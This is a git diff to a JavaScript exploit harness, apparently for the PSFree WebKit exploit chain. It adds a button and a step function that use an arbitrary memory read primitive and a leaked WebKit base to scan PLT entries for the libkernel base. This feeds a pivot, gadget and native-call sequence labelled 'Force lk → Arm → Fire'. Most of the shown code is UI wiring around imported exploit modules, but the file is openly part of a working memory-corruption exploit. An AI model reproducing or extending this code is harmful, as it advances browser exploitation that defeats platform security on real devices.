@@ -39,12 +39,14 @@ import {
     loadForcedLibkernel,
     isGetpidStub as lkIsGetpidStub,
     verifyManualLibkernel,
+    tryPsfreePltBatch,
+    resolveLibkernelPsfree,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830i";
+const BUILD_ID = "rw-20250830j";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -108,7 +110,7 @@ let raceMode = false;
 const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
-let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk, btnPeek, btnClear;
+let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk, btnPsfreeLk, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot;
 let gadgetBtns = [];
 let g5BarBtns = [];
@@ -216,6 +218,7 @@ function setUi() {
     if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
     if (btnForceLk) btnForceLk.disabled = busy || !ready;
     if (btnGuessLk) btnGuessLk.disabled = busy || !ready;
+    if (btnPsfreeLk) btnPsfreeLk.disabled = busy || !ready;
     if (btnPeek) btnPeek.disabled = busy || !ready;
     if (pickPtr) pickPtr.disabled = busy || !ready;
     if (addrIn) addrIn.disabled = busy || !ready;
@@ -358,6 +361,7 @@ const SS_CAL_EXT_PTRS = "wk-cal-ext-ptrs";
 let calPtrIdx = 0;
 let guessLkIdx = 0;
 let calLkCands = null;
+let psfreePltState = null;
 
 function parseCalPtr(raw) {
     const s = String(raw).replace(/^0x/i, "").trim();
@@ -1855,6 +1859,53 @@ function runGuessLk() {
     renderOut();
 }
 
+/** One tap — bounded PSFree PLT probe (~28 reads). Tap until LK-PSFREE-OK or miss. */
+function runPsfreeLkStep() {
+    if (!ready || busy || !window.p) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("LK-SKIP", "no webkitBase — Start first");
+        return;
+    }
+    busy = true;
+    setUi();
+    lkQuiet = true;
+    try {
+        const chunk = tryPsfreePltBatch(p, webkitBase, off, psfreePltState);
+        psfreePltState = chunk.state;
+        if (chunk.ok && chunk.lk) {
+            psfreePltState = null;
+            if (addrIn) addrIn.value = String(chunk.lk);
+            mark("LK-PSFREE-OK", chunk.source + " → " + chunk.lk
+                + " plt+0x" + chunk.pltRva.toString(16)
+                + (chunk.stubOk ? " stub20=OK" : "")
+                + " build=" + BUILD_ID);
+            state("PSFree lk OK — Force lk → Arm → Fire", "ok");
+            crashLog.append("LK-PSFREE-OK " + chunk.lk + " plt=" + chunk.pltRva, "LK-PSFREE");
+            crashLog.flushSync();
+        } else if (chunk.done && !chunk.ok) {
+            psfreePltState = null;
+            mark("LK-PSFREE-MISS", chunk.error || "no PLT hit tried=" + chunk.tried);
+            state("PSFree miss — Load cal ptr or Guess lk", "bad");
+        } else {
+            mark("LK-PSFREE", "phase=" + chunk.phase + " +0x"
+                + (chunk.cursor || 0).toString(16)
+                + " tried=" + chunk.tried + " — tap again");
+            state("PSFree scan… tried=" + chunk.tried, "warn");
+        }
+    } catch (err) {
+        mark("LK-PSFREE-FAIL", err.message || String(err));
+        state("PSFree error", "bad");
+    } finally {
+        lkQuiet = false;
+        busy = false;
+        setUi();
+        renderOut();
+    }
+}
+
 async function runLeakLkScan() {
     if (!ready || !window.p || busy) return;
     const p = window.p;
@@ -2555,6 +2606,7 @@ function init() {
     btnLoadCal = $("btn-load-cal");
     btnForceLk = $("btn-force-lk");
     btnGuessLk = $("btn-guess-lk");
+    btnPsfreeLk = $("btn-psfree-lk");
     btnVerifyPivot = $("btn-verify-pivot");
     btnScanPivot = $("btn-scan-pivot");
     btnPeek = $("btn-peek");
@@ -2577,6 +2629,7 @@ function init() {
     wireClick(btnLoadCal, function () { runTryCalPtrs(); });
     wireClick(btnForceLk, function () { runManualTest("force-lk"); });
     wireClick(btnGuessLk, function () { runGuessLk(); });
+    wireClick(btnPsfreeLk, function () { runPsfreeLkStep(); });
     wireClick(btnClear, function () {
         lines.length = 0;
         clearPersistedLog();
